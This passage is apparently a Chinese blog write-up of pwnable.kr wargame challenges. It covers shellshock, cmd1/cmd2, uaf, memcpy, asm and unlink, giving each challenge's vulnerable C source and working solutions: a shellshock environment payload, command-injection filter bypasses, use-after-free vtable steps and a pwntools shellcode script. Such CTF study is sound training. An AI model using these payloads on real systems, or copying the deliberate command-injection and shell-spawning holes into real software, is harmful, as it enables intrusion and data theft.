		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wrong Password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>第17行，先比较大小再赋值给fd, fd=0所以后续直接从输入中获取数据&hellip;&hellip;</p>
<h2 id="shellshock">shellshock</h2>
<p>CVE-2014-6271</p>
<p>漏洞大概是，Bash支持使用环境变量定义函数，如果环境变量以<code>(){</code>开头，则会被当作导入函数的定义，在shell启动时会生效。</p>
<p><a href="https://blog.csdn.net/qq_20307987/article/details/51311910" target="_blank" rel="noopener noreffer">shellshock漏洞细节</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">env <span class="nv">var</span><span class="o">=</span><span class="s1">&#39;() { :;}; /bin/cat flag&#39;</span> ./shellshock
</code></pre></td></tr></table>
</div>
</div><h2 id="coin1">coin1</h2>
<p>猜数字，直接二分法</p>
<h2 id="blackjack">blackjack</h2>
<p>赌注没做负数过滤</p>
<h2 id="lotto">lotto</h2>
<p>没过滤相同的字符，输入6个相同的数字，只要有一个随机数等于这个数，就满足输出flag的条件了</p>
<h2 id="cmd1">cmd1</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;sh&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;tmp&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
        <span class="n">putenv</span><span class="p">(</span><span class="s">&#34;PATH=/thankyouverymuch&#34;</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><ol>
<li><code>./cmd1 '/bin/cat f*'</code></li>
<li><code>./cmd1 &quot;/bin/cat \&quot;f\&quot;\&quot;l\&quot;\&quot;a\&quot;\&quot;g\&quot;&quot;</code></li>
<li>在tmp目录下写一个脚本<code>cat /home/cmd1/flag</code>然后<code>./cmd1 sc.sh</code></li>
</ol>
<h2 id="cmd2">cmd2</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">int</span> <span class="nf">filter</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">r</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;=&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;PATH&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;export&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;`&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="n">r</span> <span class="o">+=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span><span class="o">!=</span><span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">delete_env</span><span class="p">(){</span>
        <span class="kt">char</span><span class="o">**</span> <span class="n">p</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">environ</span><span class="p">;</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span> <span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">p</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
        <span class="n">delete_env</span><span class="p">();</span>
        <span class="n">putenv</span><span class="p">(</span><span class="s">&#34;PATH=/no_command_execution_until_you_become_a_hacker&#34;</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">filter</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">system</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>增加了限制条件</p>
<ol>
<li>
<p>利用$(pwd): <code>cd /; /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f*'</code></p>
</li>
<li>
<p>利用command -p参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">command: command [-pVv] command [arg ...]
    Execute a simple command or display information about commands.
   
    Runs COMMAND with ARGS suppressing  shell function lookup, or display
    information about the specified COMMANDs.  Can be used to invoke commands
    on disk when a function with the same name exists.
   
    Options:
      -p    use a default value for PATH that is guaranteed to find all of
            the standard utilities
      -v    print a description of COMMAND similar to the `type&#39; builtin
      -V    print a more verbose description of each COMMAND
   
    Exit Status:
    Returns exit status of COMMAND, or failure if COMMAND is not found.
</code></pre></td></tr></table>
</div>
</div><p>command的-p参数允许使用<code>PATH</code>中默认值，而不是程序设置的临时值</p>
<p><code>./cmd2 &quot;command -p cat \&quot;f\&quot;\&quot;l\&quot;\&quot;a\&quot;\&quot;g\&quot;&quot;</code></p>
</li>
</ol>
<h2 id="uaf">uaf</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt; </span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="n">using</span> <span class="n">namespace</span> <span class="n">std</span><span class="p">;</span>

<span class="n">class</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">private</span><span class="p">:</span>
	<span class="n">virtual</span> <span class="kt">void</span> <span class="n">give_shell</span><span class="p">(){</span>
		<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
	<span class="p">}</span>
<span class="nl">protected</span><span class="p">:</span>
	<span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
	<span class="n">string</span> <span class="n">name</span><span class="p">;</span>
<span class="nl">public</span><span class="p">:</span>
	<span class="n">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
		<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;My name is &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">name</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
		<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am &#34;</span> <span class="o">&lt;&lt;</span> <span class="n">age</span> <span class="o">&lt;&lt;</span> <span class="s">&#34; years old&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">};</span>

<span class="n">class</span> <span class="nl">Man</span><span class="p">:</span> <span class="n">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">public</span><span class="p">:</span>
	<span class="n">Man</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
		<span class="n">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
		<span class="n">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
		<span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am a nice guy!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="n">class</span> <span class="nl">Woman</span><span class="p">:</span> <span class="n">public</span> <span class="n">Human</span><span class="p">{</span>
<span class="nl">public</span><span class="p">:</span>
        <span class="n">Woman</span><span class="p">(</span><span class="n">string</span> <span class="n">name</span><span class="p">,</span> <span class="kt">int</span> <span class="n">age</span><span class="p">){</span>
                <span class="n">this</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
                <span class="n">this</span><span class="o">-&gt;</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">virtual</span> <span class="kt">void</span> <span class="n">introduce</span><span class="p">(){</span>
                <span class="n">Human</span><span class="o">::</span><span class="n">introduce</span><span class="p">();</span>
                <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;I am a cute girl!&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
	<span class="n">Human</span><span class="o">*</span> <span class="n">m</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Man</span><span class="p">(</span><span class="s">&#34;Jack&#34;</span><span class="p">,</span> <span class="mi">25</span><span class="p">);</span>
	<span class="n">Human</span><span class="o">*</span> <span class="n">w</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Woman</span><span class="p">(</span><span class="s">&#34;Jill&#34;</span><span class="p">,</span> <span class="mi">21</span><span class="p">);</span>

	<span class="n">size_t</span> <span class="n">len</span><span class="p">;</span>
	<span class="kt">char</span><span class="o">*</span> <span class="n">data</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">op</span><span class="p">;</span>
	<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
		<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;1. use</span><span class="se">\n</span><span class="s">2. after</span><span class="se">\n</span><span class="s">3. free</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
		<span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">op</span><span class="p">;</span>

		<span class="k">switch</span><span class="p">(</span><span class="n">op</span><span class="p">){</span>
			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
				<span class="n">m</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
				<span class="n">w</span><span class="o">-&gt;</span><span class="n">introduce</span><span class="p">();</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
				<span class="n">len</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
				<span class="n">data</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">char</span><span class="p">[</span><span class="n">len</span><span class="p">];</span>
				<span class="n">read</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">),</span> <span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
				<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;your data is allocated&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
				<span class="n">delete</span> <span class="n">m</span><span class="p">;</span>
				<span class="n">delete</span> <span class="n">w</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="k">default</span><span class="o">:</span>
				<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>查看Human, Man, Woman等的虚表，发现<code>give_shell</code>是第一项，<code>introduce</code>是第二项。</p>
<p>在new出来的Human结构体中，布局如下：<code>虚表指针 + age + name指针</code></p>
<p>


    <div class="post-img-view">
        <a data-fancybox="gallery" href="/images/pwnable_kr_1/image-20211103173746145.png">
            <img src="/images/pwnable_kr_1/image-20211103173746145.png" alt="image-20211103173746145"  />
        </a>
    </div>
</p>
<p>攻击：</p>
<ol>
<li>3 -&gt; free m,w这两个块</li>
<li>2 -&gt; new得到 w块，修改虚表指针的内容，改为原来的值-8，那么取第二项的时候实际会取到原来的第一项，即``give_shell`指针</li>
<li>2 -&gt; new得到 m块</li>
<li>1 -&gt; 调用<code>introduce</code>函数，实际调用到<code>give_shell</code>函数</li>
</ol>
<h2 id="memcpy">memcpy</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span><span class="o">*</span> <span class="nf">fast_memcpy</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">dest</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">len</span><span class="p">){</span>
	<span class="n">size_t</span> <span class="n">i</span><span class="p">;</span>
	<span class="c1">// 64-byte block fast copy
</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;=</span> <span class="mi">64</span><span class="p">){</span>
		<span class="n">i</span> <span class="o">=</span> <span class="n">len</span> <span class="o">/</span> <span class="mi">64</span><span class="p">;</span>
		<span class="n">len</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">64</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
		<span class="k">while</span><span class="p">(</span><span class="n">i</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
			<span class="n">__asm__</span> <span class="n">__volatile__</span> <span class="p">(</span>
			<span class="s">&#34;movdqa (%0), %%xmm0</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;movdqa 16(%0), %%xmm1</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;movdqa 32(%0), %%xmm2</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;movdqa 48(%0), %%xmm3</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;movntps %%xmm0, (%1)</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;movntps %%xmm1, 16(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;movntps %%xmm2, 32(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="s">&#34;movntps %%xmm3, 48(%1)</span><span class="se">\n</span><span class="s">&#34;</span>
			<span class="o">::</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">src</span><span class="p">),</span><span class="s">&#34;r&#34;</span><span class="p">(</span><span class="n">dest</span><span class="p">)</span><span class="o">:</span><span class="s">&#34;memory&#34;</span><span class="p">);</span>
			<span class="n">dest</span> <span class="o">+=</span> <span class="mi">64</span><span class="p">;</span>
			<span class="n">src</span> <span class="o">+=</span> <span class="mi">64</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="c1">// byte-to-byte slow copy
</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="n">slow_memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">dest</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>movntps</code>和<code>movdqa</code>要求操作的内存地址必须为16字节对齐</p>
<h2 id="asm">asm</h2>
<p>有沙箱，只能用open, read, write</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;pwnable.kr&#34;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s2">&#34;asm&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2222</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;guest&#34;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">s</span><span class="o">.</span><span class="n">connected</span><span class="p">():</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect_remote</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="mi">9026</span><span class="p">)</span>
    <span class="n">payload</span><span class="o">=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">)</span>  
    <span class="c1"># read file   </span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;rax&#34;</span><span class="p">,</span> <span class="s2">&#34;rsp&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>  
    <span class="c1"># write stdout  </span>
    <span class="n">payload</span><span class="o">+=</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;rsp&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>  
    <span class="c1"># p.recv(1024)  </span>
    <span class="c1">#gdb.attach(p)  </span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="unlink">unlink</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tagOBJ</span><span class="p">{</span>
	<span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">tagOBJ</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span><span class="n">OBJ</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">shell</span><span class="p">(){</span>
	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
<span class="p">}</span>

